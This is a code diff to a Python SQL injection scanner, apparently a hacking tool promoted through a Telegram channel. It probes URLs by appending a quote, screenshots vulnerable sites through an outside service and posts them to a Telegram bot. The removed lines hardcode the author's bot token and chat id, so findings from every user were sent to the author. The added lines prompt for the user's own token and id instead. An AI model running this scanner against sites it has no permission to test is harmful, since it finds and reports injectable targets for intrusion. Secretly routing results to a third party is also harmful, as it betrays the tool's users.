@@ -26,6 +26,8 @@ logo = """
 """
 print(logo,'\n \033[0;90m--------------------\033[2;32mhttps://t.me/black_code_22\033[0;90m--------------------')
 #--------------------start code--------------------#
+tok = input(' Enter token:  ') 
+id = input(' Enter id bot:  ') 
 def sql(url):
     try:    
         ur = get(url+"'").status_code
@@ -38,8 +40,8 @@ def sql(url):
                         res = s.get(new_url)
                         if is_vulnerable(res):
                             print("[+] SQL Injection vulnerability detected, link : ", url)
-                            img = get(f'https://api.dlyar-dev.tk/scn-wb.json?url={url}').json()["screen"]
-                            get(f'https://api.telegram.org/bot5721933211:AAHjGWMKYVEqa26KKUCRThWziBMI5-nxV_8/sendPhoto?chat_id=5599536745&photo={img}&caption=هذا الموقع قد يكون مصاب بثغرة sql \n {url} ')
+                            img = get(f'https://api.dlyar-dev.tk/scn-wb.json?url={url}').json()["screen"]  
+                            get(f'https://api.telegram.org/bot{tok}/sendPhoto?chat_id={id}&photo={img}&caption=هذا الموقع قد يكون مصاب بثغرة sql \n {url} ')
                         else:
                                                     pass
                                                     
